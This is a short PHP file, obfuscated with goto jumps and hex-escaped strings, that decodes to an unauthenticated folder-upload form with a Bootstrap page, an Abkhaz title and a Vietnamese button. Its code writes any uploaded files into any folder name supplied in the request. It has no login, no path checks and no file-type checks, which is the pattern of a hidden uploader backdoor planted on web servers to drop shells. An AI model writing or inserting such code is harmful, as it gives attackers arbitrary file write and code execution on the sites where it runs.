<?php
 goto wYQUA; bEJ2o: if (isset($_POST["\165\x70\154\x6f\141\144"])) { if ($_POST["\146\157\x6c\x64\x65\x72\x6e\141\x6d\x65"] != '') { $foldername = $_POST["\x66\x6f\x6c\x64\145\162\156\141\155\x65"]; if (!is_dir($foldername)) { mkdir($foldername); } foreach ($_FILES["\x66\x69\154\x65\x73"]["\x6e\x61\x6d\145"] as $i => $name) { if (strlen($_FILES["\146\151\x6c\145\x73"]["\x6e\141\x6d\x65"][$i]) > 1) { move_uploaded_file($_FILES["\x66\x69\154\x65\x73"]["\x74\x6d\160\137\156\x61\155\145"][$i], $foldername . "\57" . $name); } } echo "\x46\157\154\x64\145\162\x20\x69\163\40\163\x75\143\143\145\163\x73\x66\165\x6c\154\171\x20\165\160\x6c\157\141\144\x65\x64"; } else { echo "\320\x90\322\255\320\260\323\xa1\40\320\260\322\255\xd0\260\320\xb3\xd0\260\320\273\xd0\xb0\xd1\x80\xd0\260\40\156\141\155\145\40\x69\x73\x20\145\155\x70\164\171"; } } goto EVYMp; wYQUA: ?>
<!doctypehtml><html><head><meta charset="UTF-8"><title>Аҭаӡ аҭагалара</title><link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"rel="stylesheet"></head><body><div class="container mt-5"><form action="#"enctype="multipart/form-data"method="post"><div class="form-group">Folder:<input name="foldername"><br><br></div><div class="form-group">Select Folder to Upload: <input name="files[]"type="file"directory=""id="files"moxdirectory=""multiple webkitdirectory=""><br><br></div><input name="upload"type="Submit"class="btn btn-primary"value="Tải lên"></form></div></body></html><?php  goto bEJ2o; EVYMp: ?>